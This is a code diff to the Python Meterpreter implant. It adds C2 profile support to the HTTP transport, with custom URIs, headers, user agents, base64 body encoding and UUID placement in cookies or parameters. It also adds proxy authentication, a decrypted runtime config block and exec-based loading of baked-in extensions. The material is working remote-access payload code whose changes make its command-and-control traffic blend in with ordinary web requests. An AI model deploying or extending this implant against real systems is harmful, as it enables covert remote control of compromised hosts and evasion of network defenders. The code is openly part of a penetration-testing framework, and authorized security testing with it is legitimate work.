@@ -1,6 +1,8 @@
 #!/usr/bin/python
+import base64
 import binascii
 import code
+import logging
 import os
 import platform
 import random
@@ -22,7 +24,7 @@ else:
     has_windll = hasattr(ctypes, 'windll')
 
 try:
-    urllib_imports = ['ProxyBasicAuthHandler', 'ProxyHandler', 'HTTPSHandler', 'Request', 'build_opener', 'install_opener', 'urlopen']
+    urllib_imports = ['HTTPPasswordMgrWithDefaultRealm', 'ProxyBasicAuthHandler', 'ProxyHandler', 'HTTPSHandler', 'Request', 'build_opener', 'install_opener', 'urlopen']
     if sys.version_info[0] < 3:
         urllib = __import__('urllib2', fromlist=urllib_imports)
     else:
@@ -61,12 +63,9 @@ random.seed()
 DEBUGGING = False
 DEBUGGING_LOG_FILE_PATH = None
 TRY_TO_FORK = True
-HTTP_CONNECTION_URL = None
-HTTP_PROXY = None
-HTTP_USER_AGENT = None
-HTTP_COOKIE = None
-HTTP_HOST = None
-HTTP_REFERER = None
+CONFIG_BLOCK = ''
+
+# defaults used as fallbacks within transport setup
 PAYLOAD_UUID = ''
 SESSION_GUID = ''
 SESSION_COMMUNICATION_TIMEOUT = 300
@@ -76,6 +75,7 @@ SESSION_RETRY_WAIT = 10
 
 PACKET_TYPE_REQUEST        = 0
 PACKET_TYPE_RESPONSE       = 1
+PACKET_TYPE_CONFIG         = 2
 PACKET_TYPE_PLAIN_REQUEST  = 10
 PACKET_TYPE_PLAIN_RESPONSE = 11
 
@@ -176,7 +176,11 @@ TLV_TYPE_C2_UA                 = TLV_META_TYPE_STRING | 716 # User agent
 TLV_TYPE_C2_CERT_HASH          = TLV_META_TYPE_RAW    | 717 # Expected SSL certificate hash
 TLV_TYPE_C2_PREFIX             = TLV_META_TYPE_RAW    | 718 # Data to prepend to the outgoing payload
 TLV_TYPE_C2_SUFFIX             = TLV_META_TYPE_RAW    | 719 # Data to append to the outgoing payload
-TLV_TYPE_C2_ENC                = TLV_META_TYPE_UINT   | 720 # Request encoding flags (Base64|URL|Base64url)
+TLV_TYPE_C2_ENC_INBOUND        = TLV_META_TYPE_UINT   | 720 # Server->client (response) body encoding
+TLV_TYPE_C2_ENC_OUTBOUND       = TLV_META_TYPE_UINT   | 728 # Client->server (request) body encoding (POST only)
+TLV_TYPE_C2_ENC_UUID           = TLV_META_TYPE_UINT   | 729 # Encoding applied to the UUID before placement
+TLV_TYPE_C2_UUID_PREFIX        = TLV_META_TYPE_STRING | 730 # String to prepend to the encoded UUID
+TLV_TYPE_C2_UUID_SUFFIX        = TLV_META_TYPE_STRING | 731 # String to append to the encoded UUID
 TLV_TYPE_C2_PREFIX_SKIP        = TLV_META_TYPE_UINT   | 721 # Size of prefix to skip (in bytes)
 TLV_TYPE_C2_SUFFIX_SKIP        = TLV_META_TYPE_UINT   | 722 # Size of suffix to skip (in bytes)
 TLV_TYPE_C2_UUID_COOKIE        = TLV_META_TYPE_STRING | 723 # Name of the cookie to put the UUID in
@@ -195,6 +199,11 @@ EXPORTED_SYMBOLS['DEBUGGING'] = DEBUGGING
 
 ENC_NONE = 0
 ENC_AES256 = 1
+
+# C2 encoding flags
+C2_ENCODING_NONE   = 0
+C2_ENCODING_B64    = 1
+C2_ENCODING_B64URL = 2
 
 # Packet header sizes
 PACKET_XOR_KEY_SIZE = 4
@@ -367,13 +376,8 @@ COMMAND_IDS = (
 )
 # ---------------------------------------------------------------
 
-if DEBUGGING:
-    import logging
-    logging.basicConfig(level=logging.DEBUG)
-    if DEBUGGING_LOG_FILE_PATH:
-        file_handler = logging.FileHandler(DEBUGGING_LOG_FILE_PATH)
-        file_handler.setLevel(logging.DEBUG)
-        logging.getLogger().addHandler(file_handler)
+# Note: DEBUGGING is driven by the runtime config block, not a build-time
+# constant, so logging is configured where DEBUGGING is enabled (below).
 
 if has_windll:
     class SYSTEM_INFO(ctypes.Structure):
@@ -557,6 +561,22 @@ def packet_get_tlv(pkt, tlv_type):
     except IndexError:
         return {}
     return tlv
+
+def decrypt_packet(pkt, aes_key=None):
+    if pkt and len(pkt) > PACKET_HEADER_SIZE:
+        xor_key = struct.unpack('BBBB', pkt[:PACKET_XOR_KEY_SIZE])
+        raw = xor_bytes(xor_key, pkt)
+        pkt_type_off = PACKET_HEADER_SIZE - PACKET_TYPE_SIZE
+        pkt_type = struct.unpack('>I', raw[pkt_type_off:pkt_type_off+PACKET_TYPE_SIZE])[0]
+        enc_offset = PACKET_XOR_KEY_SIZE + PACKET_SESSION_GUID_SIZE
+        enc_flag = struct.unpack('>I', raw[enc_offset:enc_offset+PACKET_ENCRYPT_FLAG_SIZE])[0]
+        if enc_flag == ENC_AES256 and aes_key and pkt_type != PACKET_TYPE_CONFIG:
+            iv = raw[PACKET_HEADER_SIZE:PACKET_HEADER_SIZE+16]
+            encrypted = raw[PACKET_HEADER_SIZE+len(iv):]
+            return met_aes_decrypt(aes_key, iv, encrypted)
+        else:
+            return raw[PACKET_HEADER_SIZE:]
+    return None
 
 @export
 def tlv_pack(*args):
@@ -887,6 +907,7 @@ class Transport(object):
         self.request_retire = False
         self.aes_enabled = False
         self.aes_key = None
+        self.c2_uuid = None
 
     def __repr__(self):
         return "<{0} url='{1}' >".format(self.__class__.__name__, self.url)
@@ -900,28 +921,61 @@ class Transport(object):
         return self.communication_has_expired or self.request_retire
 
     @staticmethod
+    def _parse_c2_verb_options(group_bytes):
+        """Parse GET or POST sub-group TLV bytes into an options dict."""
+        opts = {}
+        opts['uri'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_URI).get('value')
+        opts['ua'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_UA).get('value')
+        opts['headers'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_HEADERS).get('value')
+        opts['enc_inbound'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_ENC_INBOUND).get('value', C2_ENCODING_NONE)
+        opts['enc_outbound'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_ENC_OUTBOUND).get('value', C2_ENCODING_NONE)
+        opts['enc_uuid'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_ENC_UUID).get('value', C2_ENCODING_NONE)
+        opts['uuid_prefix'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_UUID_PREFIX).get('value', '')
+        opts['uuid_suffix'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_UUID_SUFFIX).get('value', '')
+        opts['prefix_skip'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_PREFIX_SKIP).get('value', 0)
+        opts['suffix_skip'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_SUFFIX_SKIP).get('value', 0)
+        opts['prefix'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_PREFIX).get('value')
+        opts['suffix'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_SUFFIX).get('value')
+        opts['uuid_get'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_UUID_GET).get('value')
+        opts['uuid_header'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_UUID_HEADER).get('value')
+        opts['uuid_cookie'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_UUID_COOKIE).get('value')
+        return opts
+
+    @staticmethod
     def from_request(request):
         url = packet_get_tlv(request, TLV_TYPE_C2_URL)['value']
         if url.startswith('tcp'):
             transport = TcpTransport(url)
         elif url.startswith('http'):
             proxy = packet_get_tlv(request, TLV_TYPE_C2_PROXY_URL).get('value')
-            user_agent = packet_get_tlv(request, TLV_TYPE_C2_UA).get('value', HTTP_USER_AGENT)
+            proxy_user = packet_get_tlv(request, TLV_TYPE_C2_PROXY_USER).get('value')
+            proxy_pass = packet_get_tlv(request, TLV_TYPE_C2_PROXY_PASS).get('value')
+            user_agent = packet_get_tlv(request, TLV_TYPE_C2_UA).get('value')
             http_headers = packet_get_tlv(request, TLV_TYPE_C2_HEADERS).get('value', None)
-            transport = HttpTransport(url, proxy=proxy, user_agent=user_agent)
+            transport = HttpTransport(url, proxy=proxy, proxy_user=proxy_user, proxy_pass=proxy_pass,
+                    user_agent=user_agent)
             if http_headers:
                 headers = {}
                 for h in http_headers.strip().split("\r\n"):
                     p = h.split(':')
-                    headers[p[0].upper()] = ''.join(p[1:0])
+                    headers[p[0].upper()] = ':'.join(p[1:]).strip()
                 http_host = headers.get('HOST')
                 http_cookie = headers.get('COOKIE')
                 http_referer = headers.get('REFERER')
-                transport = HttpTransport(url, proxy=proxy, user_agent=user_agent, http_host=http_host,
+                transport = HttpTransport(url, proxy=proxy, proxy_user=proxy_user, proxy_pass=proxy_pass,
+                        user_agent=user_agent, http_host=http_host,
                         http_cookie=http_cookie, http_referer=http_referer)
+            # Parse C2 profile GET/POST sub-groups if present
+            get_group = packet_get_tlv(request, TLV_TYPE_C2_GET)
+            if get_group:
+                transport.c2_get = Transport._parse_c2_verb_options(get_group['value'])
+            post_group = packet_get_tlv(request, TLV_TYPE_C2_POST)
+            if post_group:
+                transport.c2_post = Transport._parse_c2_verb_options(post_group['value'])
         transport.communication_timeout = packet_get_tlv(request, TLV_TYPE_C2_COMM_TIMEOUT).get('value', SESSION_COMMUNICATION_TIMEOUT)
         transport.retry_total = packet_get_tlv(request, TLV_TYPE_C2_RETRY_TOTAL).get('value', SESSION_RETRY_TOTAL)
         transport.retry_wait = packet_get_tlv(request, TLV_TYPE_C2_RETRY_WAIT).get('value', SESSION_RETRY_WAIT)
+        transport.c2_uuid = packet_get_tlv(request, TLV_TYPE_C2_UUID).get('value')
         return transport
 
     def _activate(self):
@@ -954,18 +1008,7 @@ class Transport(object):
         return True
 
     def decrypt_packet(self, pkt):
-        if pkt and len(pkt) > PACKET_HEADER_SIZE:
-            xor_key = struct.unpack('BBBB', pkt[:PACKET_XOR_KEY_SIZE])
-            raw = xor_bytes(xor_key, pkt)
-            enc_offset = PACKET_XOR_KEY_SIZE + PACKET_SESSION_GUID_SIZE
-            enc_flag = struct.unpack('>I', raw[enc_offset:enc_offset+PACKET_ENCRYPT_FLAG_SIZE])[0]
-            if enc_flag == ENC_AES256:
-                iv = raw[PACKET_HEADER_SIZE:PACKET_HEADER_SIZE+16]
-                encrypted = raw[PACKET_HEADER_SIZE+len(iv):]
-                return met_aes_decrypt(self.aes_key, iv, encrypted)
-            else:
-                return raw[PACKET_HEADER_SIZE:]
-        return None
+        return decrypt_packet(pkt, self.aes_key)
 
     def get_packet(self):
         self.request_retire = False
@@ -1033,7 +1076,8 @@ class Transport(object):
         return trans_group
 
 class HttpTransport(Transport):
-    def __init__(self, url, proxy=None, user_agent=None, http_host=None, http_referer=None, http_cookie=None):
+    def __init__(self, url, proxy=None, proxy_user=None, proxy_pass=None,
+            user_agent=None, http_host=None, http_referer=None, http_cookie=None):
         super(HttpTransport, self).__init__()
         opener_args = []
         scheme = url.split(':', 1)[0]
@@ -1045,8 +1089,15 @@ class HttpTransport(Transport):
             opener_args.append(urllib.HTTPSHandler(0, ssl_ctx))
         if proxy:
             opener_args.append(urllib.ProxyHandler({scheme: proxy}))
-            opener_args.append(urllib.ProxyBasicAuthHandler())
+            if proxy_user is not None and proxy_pass is not None:
+                pw_mgr = urllib.HTTPPasswordMgrWithDefaultRealm()
+                pw_mgr.add_password(None, proxy, proxy_user, proxy_pass)
+                opener_args.append(urllib.ProxyBasicAuthHandler(pw_mgr))
+            else:
+                opener_args.append(urllib.ProxyBasicAuthHandler())
         self.proxy = proxy
+        self.proxy_user = proxy_user
+        self.proxy_pass = proxy_pass
         opener = urllib.build_opener(*opener_args)
         opener.addheaders = []
         if user_agent:
@@ -1063,6 +1114,91 @@ class HttpTransport(Transport):
             self._http_request_headers['Host'] = http_host
         self._first_packet = None
         self._empty_cnt = 0
+        self.c2_get = None
+        self.c2_post = None
+
+    @staticmethod
+    def _c2_encode(data, enc_flags):
+        if enc_flags == C2_ENCODING_B64:
+            return base64.b64encode(data)
+        elif enc_flags == C2_ENCODING_B64URL:
+            return base64.urlsafe_b64encode(data).rstrip(b'=')
+        return data
+
+    @staticmethod
+    def _c2_decode(data, enc_flags):
+        if enc_flags == C2_ENCODING_B64:
+            return base64.b64decode(data)
+        elif enc_flags == C2_ENCODING_B64URL:
+            # Add padding back for base64url
+            padding = 4 - (len(data) % 4)
+            if padding != 4:
+                data = data + b'=' * padding
+            return base64.urlsafe_b64decode(data)
+        return data
+
+    @staticmethod
+    def _render_uuid(c2_opts, uuid):
+        """Apply the profile's UUID transform (encode + prepend + append).
+        prefix/suffix are profile strings; the encoded UUID is base64/base64url
+        ASCII — everything lives in the string domain."""
+        if not uuid:
+            return ''
+        enc = c2_opts.get('enc_uuid', C2_ENCODING_NONE)
+        prefix = c2_opts.get('uuid_prefix') or ''
+        suffix = c2_opts.get('uuid_suffix') or ''
+        uuid_bytes = uuid.encode() if is_str(uuid) else uuid
+        encoded = HttpTransport._c2_encode(uuid_bytes, enc)
+        if isinstance(encoded, bytes):
+            encoded = encoded.decode('latin-1')
+        return prefix + encoded + suffix
+
+    def _build_request_url(self, c2_opts, uuid=None):
+        """Build the request URL using C2 profile options."""
+        # Start with the base URL (scheme://host:port) — the profile's
+        # per-verb `set uri` is the authoritative path, so LURI from
+        # self.url is intentionally discarded here.
+        match = re.match(r'(https?://[^/]+)', self.url)
+        base_url = match.group(1) if match else self.url
+        uri = c2_opts.get('uri') or ''
+        url = base_url + '/' + uri.lstrip('/')
+
+        rendered = self._render_uuid(c2_opts, uuid) if uuid else ''
+        # No param/header/cookie placement => id is carried in the URI.
+        if rendered and c2_opts.get('uuid_get'):
+            separator = '&' if '?' in url else '?'
+            url = url + separator + c2_opts['uuid_get'] + '=' + rendered
+        elif rendered and not (c2_opts.get('uuid_header') or c2_opts.get('uuid_cookie')):
+            url = url.rstrip('/') + '/' + rendered
+        return url
+
+    def _build_request_headers(self, c2_opts, uuid=None):
+        """Build request headers from C2 profile options."""
+        headers = dict(self._http_request_headers)
+        if c2_opts.get('headers'):
+            for h in c2_opts['headers'].strip().split("\r\n"):
+                p = h.split(':')
+                headers[p[0].strip()] = ':'.join(p[1:]).strip()
+        if c2_opts.get('ua'):
+            headers['User-Agent'] = c2_opts['ua']
+        rendered = self._render_uuid(c2_opts, uuid) if uuid else ''
+        if rendered and c2_opts.get('uuid_header'):
+            headers[c2_opts['uuid_header']] = rendered
+        if rendered and c2_opts.get('uuid_cookie'):
+            cookie_val = c2_opts['uuid_cookie'] + '=' + rendered
+            existing = headers.get('Cookie')
+            headers['Cookie'] = existing + '; ' + cookie_val if existing else cookie_val
+        return headers
+
+    def _get_uuid(self):
+        # Prefer the on-the-fly C2 UUID; fall back to the one in the URL.
+        if self.c2_uuid:
+            return self.c2_uuid
+        match = re.match(r'https?://[^/]+/(.*?)/?$', self.url)
+        if match:
+            extracted = match.group(1).split('/')[-1]
+            return extracted
+        return ''
 
     def _get_packet(self):
         if self._first_packet:
@@ -1070,16 +1206,35 @@ class HttpTransport(Transport):
             self._first_packet = None
             return packet
         packet = None
-        xor_key = None
         url_h = None
-        request = urllib.Request(self.url, None, self._http_request_headers)
+
+        if self.c2_get:
+            uuid = self._get_uuid()
+            url = self._build_request_url(self.c2_get, uuid)
+            headers = self._build_request_headers(self.c2_get, uuid)
+        else:
+            url = self._non_c2_url()
+            headers = self._http_request_headers
+
+        request = urllib.Request(url, None, headers)
         urlopen_kwargs = {}
         if sys.version_info > (2, 6):
             urlopen_kwargs['timeout'] = self.communication_timeout
         try:
             url_h = urllib.urlopen(request, **urlopen_kwargs)
             if url_h.code == 200:
-                packet = url_h.read()
+                raw_response = url_h.read()
+                # Strip C2 profile prefix/suffix from response if configured
+                if self.c2_get:
+                    prefix_skip = self.c2_get.get('prefix_skip', 0)
+                    suffix_skip = self.c2_get.get('suffix_skip', 0)
+                    end = len(raw_response) - suffix_skip if suffix_skip else len(raw_response)
+                    raw_response = raw_response[prefix_skip:end]
+                    enc_in = self.c2_get.get('enc_inbound', C2_ENCODING_NONE)
+                    if enc_in != C2_ENCODING_NONE:
+                        raw_response = self._c2_decode(raw_response, enc_in)
+
+                packet = raw_response
                 if len(packet) < PACKET_HEADER_SIZE:
                     packet = None  # looks corrupt
                 else:
@@ -1088,8 +1243,8 @@ class HttpTransport(Transport):
                     pkt_length = struct.unpack('>I', header[PACKET_LENGTH_OFF:PACKET_LENGTH_OFF + PACKET_LENGTH_SIZE])[0] - 8
                     if len(packet) != (pkt_length + PACKET_HEADER_SIZE):
                         packet = None  # looks corrupt
-        except:
-            debug_traceback('[-] failure to receive packet from ' + self.url)
+        except Exception as e:
+            debug_traceback('[-] failure to receive packet from ' + url)
 
         if not packet:
             if url_h and url_h.code == 200:
@@ -1104,7 +1259,23 @@ class HttpTransport(Transport):
         return packet
 
     def _send_packet(self, packet):
-        request = urllib.Request(self.url, packet, self._http_request_headers)
+        if self.c2_post:
+            uuid = self._get_uuid()
+            url = self._build_request_url(self.c2_post, uuid)
+            headers = self._build_request_headers(self.c2_post, uuid)
+            # Encode the packet based on C2 profile encoding flags
+            body = self._c2_encode(packet, self.c2_post.get('enc_outbound', C2_ENCODING_NONE))
+            # Wrap with prefix/suffix
+            prefix = self.c2_post.get('prefix') or b''
+            suffix = self.c2_post.get('suffix') or b''
+            if prefix or suffix:
+                body = prefix + body + suffix
+        else:
+            url = self._non_c2_url()
+            headers = self._http_request_headers
+            body = packet
+
+        request = urllib.Request(url, body, headers)
         urlopen_kwargs = {}
         if sys.version_info > (2, 6):
             urlopen_kwargs['timeout'] = self.communication_timeout
@@ -1112,11 +1283,17 @@ class HttpTransport(Transport):
         response = url_h.read()
 
     def patch_uuid(self, new_uuid):
-        match = re.match(r'https?://[^/]+(/.*$)', self.url)
-        if match is None:
-            return False
-        self.url = self.url[:match.span(1)[0]] + '/' + new_uuid
+        # Like metsrv request_core_patch_uuid: only swap the UUID. The URL is
+        # rebuilt from the (untouched) base each request, so the base path /
+        # LURI and any cookie/header/get-param placement stay intact.
+        self.c2_uuid = new_uuid
         return True
+
+    def _non_c2_url(self):
+        # No C2 profile: rebuild base/<uuid> every request (metsrv generate_uri
+        # equivalent) so a patched UUID is honoured without mutating self.url.
+        base = self.url.rstrip('/').rsplit('/', 1)[0]
+        return base + '/' + self._get_uuid()
 
     def tlv_pack_transport_group(self):
         trans_group  = super(HttpTransport, self).tlv_pack_transport_group()
@@ -1537,13 +1714,11 @@ class PythonMeterpreter(object):
         debug_print('[*] TLV encryption sorted')
         return ERROR_SUCCESS, response
 
-    def _core_loadlib(self, request, response):
-        data_tlv = packet_get_tlv(request, TLV_TYPE_DATA)
-        if (data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED:
-            return ERROR_FAILURE, response
-
+    def load_extension(self, data):
+        """Exec extension source bytes in the meterpreter symbol namespace.
+        Returns the libname that registered itself (or None)."""
         libname = '???'
-        match = re.search(r'^meterpreter\.register_extension\(\'([a-zA-Z0-9]+)\'\)$', str(data_tlv['value']), re.MULTILINE)
+        match = re.search(r'^meterpreter\.register_extension\(\'([a-zA-Z0-9]+)\'\)$', str(data), re.MULTILINE)
         if match is not None:
             libname = match.group(1)
 
@@ -1551,8 +1726,15 @@ class PythonMeterpreter(object):
         symbols_for_extensions = {'meterpreter': self}
         symbols_for_extensions.update(EXPORTED_SYMBOLS)
         i = code.InteractiveInterpreter(symbols_for_extensions)
-        i.runcode(compile(data_tlv['value'], 'ext_server_' + libname + '.py', 'exec'))
-        extension_name = self.last_registered_extension
+        i.runcode(compile(data, 'ext_server_' + libname + '.py', 'exec'))
+        return self.last_registered_extension
+
+    def _core_loadlib(self, request, response):
+        data_tlv = packet_get_tlv(request, TLV_TYPE_DATA)
+        if (data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED:
+            return ERROR_FAILURE, response
+
+        extension_name = self.load_extension(data_tlv['value'])
 
         if extension_name:
             check_extension = lambda x: x.startswith(extension_name)
@@ -1754,6 +1936,41 @@ class PythonMeterpreter(object):
         debug_print("[*] sending response packet")
         return response + tlv_pack(TLV_TYPE_RESULT, result)
 
+def parse_config_block(raw):
+    config_bytes = decrypt_packet(raw)
+
+    config = {}
+
+    uuid_tlv = packet_get_tlv(config_bytes, TLV_TYPE_UUID)
+    config['uuid'] = uuid_tlv.get('value', b'\x00' * 16)
+
+    guid_tlv = packet_get_tlv(config_bytes, TLV_TYPE_SESSION_GUID)
+    config['session_guid'] = guid_tlv.get('value', b'\x00' * 16)
+
+    expiry_tlv = packet_get_tlv(config_bytes, TLV_TYPE_SESSION_EXPIRY)
+    config['session_expiry'] = expiry_tlv.get('value', SESSION_EXPIRATION_TIMEOUT)
+
+    debug_tlv = packet_get_tlv(config_bytes, TLV_TYPE_DEBUG_LOG)
+    config['debug_log'] = debug_tlv.get('value')
+
+    key_tlv = packet_get_tlv(config_bytes, TLV_TYPE_SYM_KEY)
+    config['sym_key'] = key_tlv.get('value')
+
+    transports = []
+    for c2_tlv in packet_enum_tlvs(config_bytes, TLV_TYPE_C2):
+        transport = Transport.from_request(c2_tlv['value'])
+        transports.append(transport)
+    config['transports'] = transports
+
+    extensions = []
+    for ext_tlv in packet_enum_tlvs(config_bytes, TLV_TYPE_EXTENSION):
+        data_tlv = packet_get_tlv(ext_tlv['value'], TLV_TYPE_DATA)
+        data = data_tlv.get('value')
+        extensions.append(data) if data else None
+    config['extensions'] = extensions
+
+    return config
+
 # PATCH-SETUP-ENCRYPTION #
 
 _try_to_fork = TRY_TO_FORK and hasattr(os, 'fork')
@@ -1764,12 +1981,33 @@ if not _try_to_fork or (_try_to_fork and os.fork() == 0):
         except OSError:
             pass
 
-    if HTTP_CONNECTION_URL and has_urllib:
-        transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT,
-                http_host=HTTP_HOST, http_referer=HTTP_REFERER, http_cookie=HTTP_COOKIE)
-    else:
-        # PATCH-SETUP-STAGELESS-TCP-SOCKET #
-        transport = TcpTransport.from_socket(s)
+    config = parse_config_block(base64.b64decode(CONFIG_BLOCK))
+    PAYLOAD_UUID = binascii.b2a_hex(config['uuid']).decode('UTF-8')
+    SESSION_GUID = binascii.b2a_hex(config['session_guid']).decode('UTF-8')
+    if config.get('debug_log'):
+        DEBUGGING = True
+        DEBUGGING_LOG_FILE_PATH = config['debug_log']
+        logging.basicConfig(level=logging.DEBUG)
+        if DEBUGGING_LOG_FILE_PATH:
+            _dbg_fh = logging.FileHandler(DEBUGGING_LOG_FILE_PATH)
+            _dbg_fh.setLevel(logging.DEBUG)
+            logging.getLogger().addHandler(_dbg_fh)
+    transport = config['transports'][0]
+    # For staged TCP payloads, the stager has already established the socket
+    # connection, so bind it to the first transport instead of reconnecting.
+    if isinstance(transport, TcpTransport) and 's' in globals():
+        transport.socket = s
+    # PATCH-SETUP-STAGELESS-TCP-SOCKET #
     met = PythonMeterpreter(transport)
-    # PATCH-SETUP-TRANSPORTS #
+    met.session_expiry_time = config['session_expiry']
+    met.session_expiry_end = time.time() + config['session_expiry']
+    for t in config['transports'][1:]:
+        met.transports.append(t)
+    # Hot-load any extensions baked into the config block (EXTENSIONS=)
+    # before opening the C2 session, so the framework sees them at connect.
+    for ext_data in config.get('extensions', []):
+        try:
+            met.load_extension(ext_data)
+        except Exception:
+            debug_traceback('[-] failed to load baked extension')
     met.run()
